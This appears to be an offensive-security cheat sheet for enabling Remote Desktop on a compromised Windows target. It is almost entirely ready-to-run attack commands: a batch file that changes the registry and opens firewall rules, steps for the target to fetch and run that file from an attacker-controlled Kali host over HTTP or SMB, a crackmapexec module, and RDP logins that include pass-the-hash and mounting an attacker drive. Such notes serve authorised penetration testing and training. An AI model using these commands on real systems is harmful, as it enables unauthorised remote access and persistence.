# Enable Remote Desktop (RDP) on the target via an elevated shell

You will need an elevated shell to enable RDP

Save the following commands on a .bat file - ex.: `enablerdp.bat`

```cmd
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh advfirewall set rule group="remote administration" new enable="yes"
netsh advfirewall firewall set rule group="remote administration" new enable=yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service RemoteDesktop enable
netsh firewall set service RemoteDesktop enable profile=ALL
netsh firewall set service RemoteAdmin enable
sc config TermService start= auto
net start Termservice
```

## HTTP

Start hosting the file on a HTTP server

```bash
cd /usr/share/windows-resources/binaries/
sudo python -m http.server 80
```

On the target, copy the file on PowerShell and execute it.

```powershell
cd C:\Temp\
Invoke-WebRequest -Uri 'http://<Kali_IP>/enablerdp.bat' -OutFile C:\Temp\enablerdp.bat
cmd
enablerdp.bat
```

## SMB

Start hosting the file on a SMB share.

```bash
cd /usr/share/windows-resources/binaries/
impacket-smbserver share $(pwd) -smb2support
```

On the target copy the file and execute it.

```cmd
xcopy \\<Kali_IP>\share\enablerdp.bat C:\Temp\
C:\Temp\enablerdp.bat
```

OR

```bash
crackmapexec smb <Target_IP> -u '<username>' -p '<password>' -M rdp -o ACTION=enable
```

- I am not sure if this really works

Now, try to access it

```bash
rdesktop <Target_IP> -d '<DOMAIN>' -u '<User>' -p '<Pwd>'


rdesktop <Target_IP> -d '<DOMAIN>' -u '<User>' -p '<Pwd>' -r disk:kali=/home/kali
```

OR

```bash
xfreerdp /v:<Target_IP> /d:'<DOMAIN>' /u:'<User>' /p:'<Pwd>'


xfreerdp /v:<Target_IP> /d:'<DOMAIN>' /u:'<User>' /pth:'<HASH>' /drive:kali,/home/kali
```
